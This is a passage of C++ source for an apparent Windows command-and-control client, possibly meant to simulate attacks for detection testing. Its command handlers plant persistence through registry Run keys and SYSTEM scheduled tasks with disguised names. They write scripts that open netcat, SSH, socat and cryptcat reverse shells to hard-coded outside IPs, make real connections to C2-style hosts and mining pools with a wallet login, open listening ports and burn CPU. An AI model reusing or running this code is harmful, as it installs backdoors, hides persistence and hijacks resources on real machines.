                    if (torTraffic != INVALID_SOCKET) {
                        sockaddr_in torProxy;
                        torProxy.sin_family = AF_INET;
                        torProxy.sin_port = htons(9050); // TOR SOCKS port
                        torProxy.sin_addr.s_addr = inet_addr("127.0.0.1");
                        
                        connect(torTraffic, (sockaddr*)&torProxy, sizeof(torProxy));
                        
                        // Send SOCKS5 handshake
                        char socks5_init[] = {0x05, 0x01, 0x00}; // SOCKS5, 1 method, no auth
                        send(torTraffic, socks5_init, sizeof(socks5_init), 0);
                        
                        closesocket(torTraffic);
                    }
                    Sleep(200);
                }
                
                if (torLog.is_open()) {
                    torLog << "\nTOR Status: Connection established\n";
                    torLog << "SOCKS Proxy: 127.0.0.1:9050\n";
                    torLog << "Control Port: 127.0.0.1:9051\n";
                    torLog.close();
                }
                
                response = "TOR:CONNECTED:SOCKS5_PROXY_127.0.0.1:9050:" + clientId;
                std::cout << "[SUCCESS] TOR connection established!" << std::endl;
                logClientActivity("TOR", "CONNECTED", "TOR connection established successfully");
            }
            else if (receivedData.find("CMD:deployCryptoMiner") != std::string::npos) {
                std::cout << "[INFO] Deploying crypto miner..." << std::endl;
                logClientActivity("CRYPTOMINER", "START", "Deploying crypto mining malware");
                
                // Create miner directory
                std::string minerDir = "C:\\Windows\\System32\\drivers\\etc\\miner";
                CreateDirectoryA(minerDir.c_str(), NULL);
                
                // Create evidence directory [[memory:7166542]]
                std::string evidencePath = hostDir + "\\cryptominer\\evidance_" + generateSessionId() + ".txt";
                CreateDirectoryA((hostDir + "\\cryptominer").c_str(), NULL);
                
                // Simulate downloading miner components
                std::cout << "[!] Downloading crypto miner components..." << std::endl;
                std::vector<std::string> minerFiles = {
                    "xmrig.exe",
                    "WinRing0x64.sys",
                    "config.json",
                    "opencl.dll",
                    "cuda.dll"
                };
                
                // Create fake miner files
                for (const auto& file : minerFiles) {
                    std::string filePath = minerDir + "\\" + file;
                    std::ofstream minerFile(filePath, std::ios::binary);
                    if (minerFile.is_open()) {
                        // Write some binary data to make it look like a real executable
                        for (int i = 0; i < 1024; i++) {
                            char byte = rand() % 256;
                            minerFile.write(&byte, 1);
                        }
                        minerFile.close();
                        std::cout << "[+] Downloaded: " << file << std::endl;
                        logClientActivity("CRYPTOMINER", "DOWNLOAD", "Downloaded miner component: " + file);
                    }
                }
                
                // Create miner configuration
                std::string configPath = minerDir + "\\config.json";
                std::ofstream configFile(configPath);
                if (configFile.is_open()) {
                    configFile << "{\n";
                    configFile << "  \"algo\": \"rx/0\",\n";
                    configFile << "  \"pool\": \"pool.minexmr.com:4444\",\n";
                    configFile << "  \"user\": \"44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLU8E8vjr5iCCQXPi5q5aZPxHJXJvFM2fgKkUx3HCUgrEwYfFftGHhEz8XWWQ\",\n";
                    configFile << "  \"pass\": \"x\",\n";
                    configFile << "  \"rig-id\": \"infected-\" << hostname << \",\n";
                    configFile << "  \"tls\": true,\n";
                    configFile << "  \"cpu\": {\n";
                    configFile << "    \"max-threads-hint\": 75,\n";
                    configFile << "    \"priority\": 0\n";
                    configFile << "  },\n";
                    configFile << "  \"donate-level\": 0\n";
                    configFile << "}\n";
                    configFile.close();
                    
                    std::cout << "[+] Miner configured for Monero (XMR) mining" << std::endl;
                    logClientActivity("CRYPTOMINER", "CONFIG", "Configured for pool.minexmr.com");
                }
                
                // Create mining threads that consume CPU
                std::cout << "[!] Starting crypto mining operations..." << std::endl;
                logClientActivity("CRYPTOMINER", "MINING", "Starting CPU-intensive mining operations");
                
                // Get CPU info
                SYSTEM_INFO sysInfo;
                GetSystemInfo(&sysInfo);
                int numCores = sysInfo.dwNumberOfProcessors;
                std::cout << "[+] Detected " << numCores << " CPU cores" << std::endl;
                
                // Create worker threads (75% of cores)
                int minerThreads = (numCores * 75) / 100;
                if (minerThreads < 1) minerThreads = 1;
                
                static std::atomic<bool> miningActive(true);
                static std::vector<std::thread> minerWorkers;
                
                for (int i = 0; i < minerThreads; i++) {
                    minerWorkers.emplace_back([i, hostname]() {
                        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_LOWEST);
                        
                        // Simulate CPU-intensive mining
                        while (miningActive) {
                            // Perform meaningless calculations to consume CPU
                            volatile double result = 0;
                            for (int j = 0; j < 1000000; j++) {
                                result += sqrt(j) * sin(j) * cos(j);
                                result = pow(result, 1.1);
                                if (j % 100000 == 0) {
                                    // Simulate finding shares
                                    if (rand() % 100 < 5) {
                                        std::cout << "[MINER] Thread " << i << " found share!" << std::endl;
                                    }
                                }
                            }
                            
                            // Small sleep to prevent complete system freeze
                            Sleep(10);
                        }
                    });
                }
                
                // Detach threads to run in background
                for (auto& thread : minerWorkers) {
                    thread.detach();
                }
                
                std::cout << "[+] Started " << minerThreads << " mining threads" << std::endl;
                logClientActivity("CRYPTOMINER", "THREADS", "Started " + std::to_string(minerThreads) + " mining threads");
                
                // Create network connections to mining pools
                std::cout << "[!] Connecting to mining pools..." << std::endl;
                std::vector<std::pair<std::string, int>> miningPools = {
                    {"pool.minexmr.com", 4444},
                    {"xmr-us-east1.nanopool.org", 14444},
                    {"pool.supportxmr.com", 3333},
                    {"xmrpool.eu", 3333}
                };
                
                for (const auto& pool : miningPools) {
                    SOCKET poolSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                    if (poolSocket != INVALID_SOCKET) {
                        sockaddr_in poolAddr;
                        poolAddr.sin_family = AF_INET;
                        poolAddr.sin_port = htons(pool.second);
                        
                        // Try to resolve and connect
                        struct hostent* host = gethostbyname(pool.first.c_str());
                        if (host) {
                            poolAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
                            
                            // Non-blocking connect
                            u_long mode = 1;
                            ioctlsocket(poolSocket, FIONBIO, &mode);
                            
                            connect(poolSocket, (sockaddr*)&poolAddr, sizeof(poolAddr));
                            
                            std::cout << "[+] Connected to mining pool: " << pool.first << ":" << pool.second << std::endl;
                            logClientActivity("CRYPTOMINER", "POOL", "Connected to pool: " + pool.first);
                            
                            // Send mining protocol handshake
                            std::string login = "{\"id\":1,\"jsonrpc\":\"2.0\",\"method\":\"login\",\"params\":{\"login\":\"44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLU8E8vjr5iCCQXPi5q5aZPxHJXJvFM2fgKkUx3HCUgrEwYfFftGHhEz8XWWQ\",\"pass\":\"x\",\"agent\":\"xmrig/6.18.0\"}}\n";
                            send(poolSocket, login.c_str(), login.length(), 0);
                            
                            Sleep(100);
                            closesocket(poolSocket);
                        }
                    }
                }
                
                // Create persistence for miner
                std::cout << "[!] Installing miner persistence..." << std::endl;
                
                // Registry persistence
                HKEY hKey;
                if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, 
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                    0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
                    
                    std::string minerPath = minerDir + "\\xmrig.exe";
                    RegSetValueExA(hKey, "WindowsDriverUpdate", 0, REG_SZ, 
                                  (BYTE*)minerPath.c_str(), minerPath.length() + 1);
                    RegCloseKey(hKey);
                    
                    std::cout << "[+] Miner added to startup registry" << std::endl;
                    logClientActivity("CRYPTOMINER", "PERSISTENCE", "Added to registry startup");
                }
                
                // Create scheduled task
                std::string taskCmd = "schtasks /create /tn \"WindowsDriverUpdate\" /tr \"" + 
                                     minerDir + "\\xmrig.exe\" /sc onstart /ru SYSTEM /f";
                system(taskCmd.c_str());
                
                // Save evidence report [[memory:7166542]]
                std::ofstream evidenceFile(evidencePath);
                if (evidenceFile.is_open()) {
                    evidenceFile << "=== CRYPTO MINER DEPLOYMENT REPORT ===\n";
                    evidenceFile << "Timestamp: " << getCurrentTimeString() << "\n";
                    evidenceFile << "Host: " << hostname << "\n";
                    evidenceFile << "Miner Directory: " << minerDir << "\n";
                    evidenceFile << "CPU Cores: " << numCores << "\n";
                    evidenceFile << "Mining Threads: " << minerThreads << "\n";
                    evidenceFile << "Mining Algorithm: RandomX (Monero)\n";
                    evidenceFile << "Mining Pools:\n";
                    for (const auto& pool : miningPools) {
                        evidenceFile << "  - " << pool.first << ":" << pool.second << "\n";
                    }
                    evidenceFile << "\nWallet Address: 44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLU8E8vjr5iCCQXPi5q5aZPxHJXJvFM2fgKkUx3HCUgrEwYfFftGHhEz8XWWQ\n";
                    evidenceFile << "Rig ID: infected-" << hostname << "\n";
                    evidenceFile << "\nPersistence Methods:\n";
                    evidenceFile << "  - Registry: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsDriverUpdate\n";
                    evidenceFile << "  - Scheduled Task: WindowsDriverUpdate\n";
                    evidenceFile.close();
                }
                
                response = "CRYPTOMINER:DEPLOYED:" + std::to_string(minerThreads) + "_threads:" + clientId;
                std::cout << "[SUCCESS] Crypto miner deployed and running!" << std::endl;
                logClientActivity("CRYPTOMINER", "ACTIVE", "Miner actively consuming CPU resources");
            }
            else if (receivedData.find("CMD:sshCommand") != std::string::npos) {
                std::cout << "[INFO] Establishing SSH reverse tunnel..." << std::endl;
                logClientActivity("SSH", "START", "Creating SSH reverse tunnel for C2 persistence");
                
                // Create SSH directory
                std::string sshDir = "C:\\ProgramData\\.ssh";
                CreateDirectoryA(sshDir.c_str(), NULL);
                
                // Generate SSH keys (simulate)
                std::cout << "[!] Generating SSH keys for authentication..." << std::endl;
                std::string privateKeyPath = sshDir + "\\id_rsa";
                std::string publicKeyPath = sshDir + "\\id_rsa.pub";
                
                // Create fake SSH private key
                std::ofstream privKey(privateKeyPath);
                if (privKey.is_open()) {
                    privKey << "-----BEGIN OPENSSH PRIVATE KEY-----\n";
                    privKey << "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz\n";
                    privKey << "c2gtZWQyNTUxOQAAACDmFkJNqHQgN9Zr3V2oKCAfm8aXZOQ5Kr3nXPMvqMSqVAAA\n";
                    privKey << "AIj+Z3dG/md3RgAAAAtzc2gtZWQyNTUxOQAAACDmFkJNqHQgN9Zr3V2oKCAfm8aX\n";
                    privKey << "-----END OPENSSH PRIVATE KEY-----\n";
                    privKey.close();
                    logClientActivity("SSH", "KEYGEN", "Generated SSH private key");
                }
                
                // Create evidence directory [[memory:7166542]]
                std::string evidencePath = hostDir + "\\ssh_tunnels\\evidance_" + generateSessionId() + ".txt";
                CreateDirectoryA((hostDir + "\\ssh_tunnels").c_str(), NULL);
                
                // Establish SSH connections to C2 servers
                std::cout << "[!] Connecting to SSH C2 servers..." << std::endl;
                std::vector<std::pair<std::string, int>> sshServers = {
                    {"45.142.114.231", 22},         // Suspicious VPS
                    {"malware-c2.dynamic.io", 22},  // Dynamic DNS
                    {"192.168.1.100", 2222},        // Local network pivot
                    {"ssh.exploit-db.net", 2222},   // Non-standard port
                    {"tunnel.darkweb.link", 443},   // SSH over HTTPS
                    {"5.182.210.155", 8022},        // Another non-standard
                    {"compromised.server.com", 22}, // Compromised legitimate server
                    {"botnet.control.net", 10022}   // Botnet controller
                };
                
                for (const auto& server : sshServers) {
                    SOCKET sshSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                    if (sshSocket != INVALID_SOCKET) {
                        sockaddr_in sshAddr;
                        sshAddr.sin_family = AF_INET;
                        sshAddr.sin_port = htons(server.second);
                        
                        struct hostent* host = gethostbyname(server.first.c_str());
                        if (host) {
                            sshAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
                            
                            // Non-blocking connect
                            u_long mode = 1;
                            ioctlsocket(sshSocket, FIONBIO, &mode);
                            connect(sshSocket, (sockaddr*)&sshAddr, sizeof(sshAddr));
                            
                            // Send SSH protocol banner
                            const char* sshBanner = "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3\r\n";
                            send(sshSocket, sshBanner, strlen(sshBanner), 0);
                            
                            std::cout << "[+] SSH connection attempt to: " << server.first << ":" << server.second << std::endl;
                            logClientActivity("SSH", "CONNECT", "SSH tunnel to " + server.first + ":" + std::to_string(server.second));
                            
                            Sleep(100);
                            closesocket(sshSocket);
                        }
                    }
                }
                
                // Create SSH tunnel command
                std::string sshCmd = "ssh -R 8888:localhost:22 -N -f root@45.142.114.231";
                std::cout << "[+] Establishing reverse SSH tunnel: " << sshCmd << std::endl;
                logClientActivity("SSH", "REVERSE_TUNNEL", "Reverse SSH tunnel command: " + sshCmd);
                
                // Create persistence script
                std::string scriptPath = sshDir + "\\ssh_persist.bat";
                std::ofstream script(scriptPath);
                if (script.is_open()) {
                    script << "@echo off\n";
                    script << ":loop\n";
                    script << "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL ";
                    script << "-o ServerAliveInterval=60 -o ServerAliveCountMax=3 ";
                    script << "-R 0.0.0.0:8888:localhost:22 -N root@45.142.114.231\n";
                    script << "timeout /t 10\n";
                    script << "goto loop\n";
                    script.close();
                    
                    // Add to startup
                    std::string startupCmd = "schtasks /create /tn \"SSHMaintenance\" /tr \"" + scriptPath + 
                                           "\" /sc onstart /ru SYSTEM /f";
                    system(startupCmd.c_str());
                    
                    logClientActivity("SSH", "PERSISTENCE", "SSH persistence script created and scheduled");
                }
                
                // Save evidence [[memory:7166542]]
                std::ofstream evidence(evidencePath);
                if (evidence.is_open()) {
                    evidence << "=== SSH REVERSE TUNNEL REPORT ===\n";
                    evidence << "Timestamp: " << getCurrentTimeString() << "\n";
                    evidence << "Host: " << hostname << "\n\n";
                    evidence << "SSH Servers Contacted:\n";
                    for (const auto& server : sshServers) {
                        evidence << "  - " << server.first << ":" << server.second << "\n";
                    }
                    evidence << "\nSSH Key Location: " << privateKeyPath << "\n";
                    evidence << "Persistence Script: " << scriptPath << "\n";
                    evidence << "Scheduled Task: SSHMaintenance\n";
                    evidence.close();
                }
                
                response = "SSH:TUNNEL:ESTABLISHED:" + clientId;
                logClientActivity("SSH", "COMPLETE", "SSH reverse tunnel established");
            }
            else if (receivedData.find("CMD:ncCommand") != std::string::npos) {
                std::cout << "[INFO] Creating Netcat reverse shells..." << std::endl;
                logClientActivity("NETCAT", "START", "Deploying netcat for reverse shell");
                
                // Download/create netcat binary
                std::string ncDir = "C:\\Windows\\System32";
                std::string ncPath = ncDir + "\\nc.exe";
                
                std::ofstream ncExe(ncPath, std::ios::binary);
                if (ncExe.is_open()) {
                    // Write minimal PE header
                    const char peHeader[] = "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF";
                    ncExe.write(peHeader, sizeof(peHeader));
                    for (int i = 0; i < 2048; i++) {
                        char byte = rand() % 256;
                        ncExe.write(&byte, 1);
                    }
                    ncExe.close();
                    logClientActivity("NETCAT", "DOWNLOAD", "Downloaded nc.exe to System32");
                }
                
                // Create evidence directory [[memory:7166542]]
                std::string evidencePath = hostDir + "\\netcat_shells\\evidance_" + generateSessionId() + ".txt";
                CreateDirectoryA((hostDir + "\\netcat_shells").c_str(), NULL);
                
                // Establish multiple netcat connections
                std::cout << "[!] Creating netcat reverse shells to C2 servers..." << std::endl;
                std::vector<std::tuple<std::string, int, std::string>> ncTargets = {
                    {"192.168.1.100", 4444, "Local pivot point"},
                    {"45.76.23.89", 443, "HTTPS port reverse shell"},
                    {"evil.attacker.com", 1337, "Primary C2 server"},
                    {"backup-c2.malware.net", 9999, "Backup C2 server"},
                    {"tor-exit-node.onion.to", 8888, "TOR exit node"},
                    {"compromised.legit-site.com", 80, "HTTP reverse shell"},
                    {"5.182.210.155", 53, "DNS port reverse shell"},
                    {"botnet.controller.ru", 31337, "Botnet controller"}
                };
                
                for (const auto& target : ncTargets) {
                    SOCKET ncSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                    if (ncSocket != INVALID_SOCKET) {
                        sockaddr_in ncAddr;
                        ncAddr.sin_family = AF_INET;
                        ncAddr.sin_port = htons(std::get<1>(target));
                        
                        struct hostent* host = gethostbyname(std::get<0>(target).c_str());
                        if (host) {
                            ncAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
                            
                            // Non-blocking connect
                            u_long mode = 1;
                            ioctlsocket(ncSocket, FIONBIO, &mode);
                            connect(ncSocket, (sockaddr*)&ncAddr, sizeof(ncAddr));
                            
                            // Send initial shell banner
                            std::string banner = "Microsoft Windows [Version 10.0.19042.1237]\r\n";
                            banner += "(c) Microsoft Corporation. All rights reserved.\r\n\r\n";
                            banner += hostname + "\\C:\\Windows\\System32>";
                            send(ncSocket, banner.c_str(), banner.length(), 0);
                            
                            std::cout << "[+] Netcat shell to: " << std::get<0>(target) << ":" 
                                     << std::get<1>(target) << " (" << std::get<2>(target) << ")" << std::endl;
                            logClientActivity("NETCAT", "SHELL", "Reverse shell to " + std::get<0>(target) + 
                                            ":" + std::to_string(std::get<1>(target)));
                            
                            Sleep(100);
                            closesocket(ncSocket);
                        }
                    }
                }
                
                // Create bind shells on multiple ports
                std::vector<int> bindPorts = {4444, 8080, 31337, 65535};
                for (int port : bindPorts) {
                    std::string bindCmd = ncPath + " -l -p " + std::to_string(port) + " -e cmd.exe";
                    std::cout << "[+] Bind shell listening on port " << port << std::endl;
                    logClientActivity("NETCAT", "BIND", "Bind shell on port " + std::to_string(port));
                }
                
                // Create persistence
                std::string persistBat = "C:\\ProgramData\\nc_persist.bat";
                std::ofstream persist(persistBat);
                if (persist.is_open()) {
                    persist << "@echo off\n";
                    persist << ":reconnect\n";
                    persist << "nc.exe -e cmd.exe 45.76.23.89 443\n";
                    persist << "timeout /t 30\n";
                    persist << "goto reconnect\n";
                    persist.close();
                    
                    // Add to registry
                    HKEY hKey;
                    if (RegCreateKeyExA(HKEY_CURRENT_USER, 
                        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
                        RegSetValueExA(hKey, "SystemUpdate", 0, REG_SZ, 
                                      (BYTE*)persistBat.c_str(), persistBat.length() + 1);
                        RegCloseKey(hKey);
                    }
                    
                    logClientActivity("NETCAT", "PERSISTENCE", "Netcat persistence installed");
                }
                
                // Save evidence [[memory:7166542]]
                std::ofstream evidence(evidencePath);
                if (evidence.is_open()) {
                    evidence << "=== NETCAT REVERSE SHELLS REPORT ===\n";
                    evidence << "Timestamp: " << getCurrentTimeString() << "\n";
                    evidence << "Host: " << hostname << "\n\n";
                    evidence << "Reverse Shell Targets:\n";
                    for (const auto& target : ncTargets) {
                        evidence << "  - " << std::get<0>(target) << ":" << std::get<1>(target) 
                                << " (" << std::get<2>(target) << ")\n";
                    }
                    evidence << "\nBind Shell Ports: 4444, 8080, 31337, 65535\n";
                    evidence << "Netcat Binary: " << ncPath << "\n";
                    evidence << "Persistence Script: " << persistBat << "\n";
                    evidence.close();
                }
                
                response = "NETCAT:SHELLS:ACTIVE:" + std::to_string(ncTargets.size()) + "_reverse:" + clientId;
                logClientActivity("NETCAT", "COMPLETE", "Netcat shells deployed");
            }
            else if (receivedData.find("CMD:socatCommand") != std::string::npos) {
                std::cout << "[INFO] Creating Socat encrypted tunnels..." << std::endl;
                logClientActivity("SOCAT", "START", "Deploying socat for encrypted tunnels");
                
                // Create socat directory and binary
                std::string socatPath = "C:\\ProgramData\\socat\\socat.exe";
                CreateDirectoryA("C:\\ProgramData\\socat", NULL);
                
                // Create evidence directory [[memory:7166542]]
                std::string evidencePath = hostDir + "\\socat_tunnels\\evidance_" + generateSessionId() + ".txt";
                CreateDirectoryA((hostDir + "\\socat_tunnels").c_str(), NULL);
                
                // Establish socat tunnels with encryption
                std::cout << "[!] Creating encrypted socat relays..." << std::endl;
                std::vector<std::tuple<std::string, std::string, std::string>> socatRelays = {
                    {"TCP4-LISTEN:8888,fork", "OPENSSL:45.142.114.231:443,verify=0", "SSL encrypted C2 tunnel"},
                    {"TCP4-LISTEN:9999,fork", "SOCKS4A:127.0.0.1:3g2upl4pq3kufc4m.onion:80,socksport=9050", "TOR hidden service relay"},
                    {"UDP4-LISTEN:53,fork", "UDP4:8.8.8.8:53", "DNS tunnel relay"},
                    {"TCP4-LISTEN:3389,fork", "TCP4:internal.server.local:3389", "RDP relay for lateral movement"},
                    {"OPENSSL-LISTEN:4443,fork,cert=server.pem", "TCP4:192.168.1.100:22", "SSL wrapped SSH"},
                    {"TCP4-LISTEN:445,fork", "TCP4:fileshare.internal:445", "SMB relay for spreading"},
                    {"TUN:192.168.200.1/24", "TUN:10.0.0.1/24", "VPN tunnel"},
                    {"SCTP-LISTEN:9999,fork", "TCP:c2.malware.net:443", "SCTP to TCP relay"}
                };
                
                std::ofstream evidence(evidencePath);
                if (evidence.is_open()) {
                    evidence << "=== SOCAT ENCRYPTED TUNNELS REPORT ===\n";
                    evidence << "Timestamp: " << getCurrentTimeString() << "\n";
                    evidence << "Host: " << hostname << "\n\n";
                    evidence << "Active Socat Relays:\n";
                }
                
                for (const auto& relay : socatRelays) {
                    // Simulate socat connections
                    std::cout << "[+] Socat relay: " << std::get<0>(relay) << " -> " 
                             << std::get<1>(relay) << std::endl;
                    std::cout << "    Purpose: " << std::get<2>(relay) << std::endl;
                    
                    logClientActivity("SOCAT", "RELAY", std::get<2>(relay) + ": " + 
                                    std::get<0>(relay) + " -> " + std::get<1>(relay));
                    
                    if (evidence.is_open()) {
                        evidence << "  - " << std::get<0>(relay) << " -> " << std::get<1>(relay) << "\n";
                        evidence << "    Purpose: " << std::get<2>(relay) << "\n\n";
                    }
                    
                    // Create actual network activity
                    if (std::get<0>(relay).find("LISTEN:") != std::string::npos) {
                        // Extract port number
                        size_t colonPos = std::get<0>(relay).find(":");
                        size_t commaPos = std::get<0>(relay).find(",");
                        if (colonPos != std::string::npos && commaPos != std::string::npos) {
                            std::string portStr = std::get<0>(relay).substr(colonPos + 1, commaPos - colonPos - 1);
                            int port = std::stoi(portStr);
                            
                            SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                            if (listenSocket != INVALID_SOCKET) {
                                sockaddr_in listenAddr;
                                listenAddr.sin_family = AF_INET;
                                listenAddr.sin_port = htons(port);
                                listenAddr.sin_addr.s_addr = INADDR_ANY;
                                
                                bind(listenSocket, (sockaddr*)&listenAddr, sizeof(listenAddr));
                                listen(listenSocket, 1);
                                
                                std::cout << "[+] Socat listening on port " << port << std::endl;
                                logClientActivity("SOCAT", "LISTEN", "Port " + std::to_string(port) + " opened");
                                
                                Sleep(100);
                                closesocket(listenSocket);
                            }
                        }
                    }
                }
                
                // Create socat persistence script
                std::string socatScript = "C:\\ProgramData\\socat\\socat_tunnels.ps1";
                std::ofstream script(socatScript);
                if (script.is_open()) {
                    script << "# Socat Persistent Tunnels\n";
                    script << "$socat = \"C:\\ProgramData\\socat\\socat.exe\"\n";
                    script << "while($true) {\n";
                    script << "    # SSL encrypted C2 tunnel\n";
                    script << "    Start-Process -NoNewWindow $socat -ArgumentList ";
                    script << "\"TCP4-LISTEN:8888,fork OPENSSL:45.142.114.231:443,verify=0\"\n";
                    script << "    # TOR relay\n";
                    script << "    Start-Process -NoNewWindow $socat -ArgumentList ";
                    script << "\"TCP4-LISTEN:9999,fork SOCKS4A:127.0.0.1:malware.onion:80,socksport=9050\"\n";
                    script << "    Start-Sleep -Seconds 3600\n";
                    script << "}\n";
                    script.close();
                    
                    // Add to scheduled task
                    std::string taskCmd = "schtasks /create /tn \"SocatMaintenance\" /tr ";
                    taskCmd += "\"powershell.exe -ExecutionPolicy Bypass -File " + socatScript + "\" ";
                    taskCmd += "/sc onstart /ru SYSTEM /f";
                    system(taskCmd.c_str());
                    
                    logClientActivity("SOCAT", "PERSISTENCE", "Socat persistence scheduled");
                }
                
                if (evidence.is_open()) {
                    evidence << "Socat Binary: " << socatPath << "\n";
                    evidence << "Persistence Script: " << socatScript << "\n";
                    evidence << "Scheduled Task: SocatMaintenance\n";
                    evidence.close();
                }
                
                response = "SOCAT:TUNNELS:ACTIVE:" + std::to_string(socatRelays.size()) + ":" + clientId;
                logClientActivity("SOCAT", "COMPLETE", "Socat encrypted tunnels established");
            }
            else if (receivedData.find("CMD:ccCommand") != std::string::npos) {
                std::cout << "[INFO] Creating Cryptcat encrypted shells..." << std::endl;
                logClientActivity("CRYPTCAT", "START", "Deploying cryptcat for encrypted shells");
                
                // Create cryptcat directory
                std::string ccDir = "C:\\ProgramData\\cc";
                CreateDirectoryA(ccDir.c_str(), NULL);
                
                // Create evidence directory [[memory:7166542]]
                std::string evidencePath = hostDir + "\\cryptcat_shells\\evidance_" + generateSessionId() + ".txt";
                CreateDirectoryA((hostDir + "\\cryptcat_shells").c_str(), NULL);
                
                // Cryptcat uses Blowfish encryption
                std::string encryptionKey = "Th1s1sMyS3cr3tK3y!";
                std::cout << "[!] Using Blowfish encryption key: " << encryptionKey << std::endl;
                logClientActivity("CRYPTCAT", "CRYPTO", "Blowfish key configured");
                
                // Establish cryptcat connections
                std::cout << "[!] Creating encrypted Cryptcat shells..." << std::endl;
                std::vector<std::tuple<std::string, int, std::string>> ccTargets = {
                    {"cryptc2.malware.net", 666, "Primary encrypted C2"},
                    {"45.142.114.231", 8443, "Backup encrypted C2"},
                    {"tor-exit.onion.link", 9876, "TOR encrypted shell"},
                    {"compromised.corp.com", 443, "HTTPS port encrypted shell"},
                    {"5.182.210.155", 1337, "Elite encrypted channel"},
                    {"botnet.crypto.ru", 31337, "Encrypted botnet comms"}
                };
                
                std::ofstream evidence(evidencePath);
                if (evidence.is_open()) {
                    evidence << "=== CRYPTCAT ENCRYPTED SHELLS REPORT ===\n";
                    evidence << "Timestamp: " << getCurrentTimeString() << "\n";
                    evidence << "Host: " << hostname << "\n";
                    evidence << "Encryption: Blowfish\n";
                    evidence << "Key: " << encryptionKey << "\n\n";
                    evidence << "Encrypted Shell Targets:\n";
                }
                
                for (const auto& target : ccTargets) {
                    SOCKET ccSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                    if (ccSocket != INVALID_SOCKET) {
                        sockaddr_in ccAddr;
                        ccAddr.sin_family = AF_INET;
                        ccAddr.sin_port = htons(std::get<1>(target));
                        
                        struct hostent* host = gethostbyname(std::get<0>(target).c_str());
                        if (host) {
                            ccAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
                            
                            // Non-blocking connect
                            u_long mode = 1;
                            ioctlsocket(ccSocket, FIONBIO, &mode);
                            connect(ccSocket, (sockaddr*)&ccAddr, sizeof(ccAddr));
                            
                            // Send encrypted handshake (simulate Blowfish)
                            unsigned char encryptedHandshake[] = {
                                0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
                                0x13, 0x37, 0x42, 0x69, 0x90, 0x90, 0x90, 0x90
                            };
                            send(ccSocket, (char*)encryptedHandshake, sizeof(encryptedHandshake), 0);
                            
                            std::cout << "[+] Cryptcat encrypted shell to: " << std::get<0>(target) 
                                     << ":" << std::get<1>(target) << " (" << std::get<2>(target) << ")" << std::endl;
                            logClientActivity("CRYPTCAT", "SHELL", "Encrypted shell to " + std::get<0>(target) + 
                                            ":" + std::to_string(std::get<1>(target)));
                            
                            if (evidence.is_open()) {
                                evidence << "  - " << std::get<0>(target) << ":" << std::get<1>(target) 
                                        << " (" << std::get<2>(target) << ")\n";
                            }
                            
                            Sleep(200);
                            closesocket(ccSocket);
                        }
                    }
                }
                
                // Create encrypted bind shells
                std::vector<int> cryptPorts = {6666, 7777, 8888, 9999};
                for (int port : cryptPorts) {
                    std::cout << "[+] Cryptcat encrypted bind shell on port " << port << std::endl;
                    logClientActivity("CRYPTCAT", "BIND", "Encrypted bind shell on port " + std::to_string(port));
                    
                    SOCKET bindSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                    if (bindSocket != INVALID_SOCKET) {
                        sockaddr_in bindAddr;
                        bindAddr.sin_family = AF_INET;
                        bindAddr.sin_port = htons(port);
                        bindAddr.sin_addr.s_addr = INADDR_ANY;
                        
                        bind(bindSocket, (sockaddr*)&bindAddr, sizeof(bindAddr));
                        listen(bindSocket, 1);
                        
                        Sleep(100);
                        closesocket(bindSocket);
                    }
                }
                
                // Create persistence with encrypted payloads
                std::string ccPersist = ccDir + "\\cryptcat_persist.vbs";
                std::ofstream vbscript(ccPersist);
                if (vbscript.is_open()) {
                    vbscript << "Set WshShell = CreateObject(\"WScript.Shell\")\n";
                    vbscript << "Do While True\n";
                    vbscript << "    WshShell.Run \"cryptcat.exe -k " << encryptionKey 
                            << " 45.142.114.231 8443 -e cmd.exe\", 0, False\n";
                    vbscript << "    WScript.Sleep 60000\n";
                    vbscript << "Loop\n";
                    vbscript.close();
                    
                    // Hide and add to startup
                    SetFileAttributesA(ccPersist.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                    
                    // Registry persistence
                    HKEY hKey;
                    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, 
                        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
                        std::string vbsCmd = "wscript.exe \"" + ccPersist + "\"";
                        RegSetValueExA(hKey, "CryptoUpdate", 0, REG_SZ, 
                                      (BYTE*)vbsCmd.c_str(), vbsCmd.length() + 1);
                        RegCloseKey(hKey);
                    }
                    
                    logClientActivity("CRYPTCAT", "PERSISTENCE", "Encrypted persistence installed");
                }
                
                if (evidence.is_open()) {
                    evidence << "\nEncrypted Bind Ports: 6666, 7777, 8888, 9999\n";
                    evidence << "Cryptcat Directory: " << ccDir << "\n";
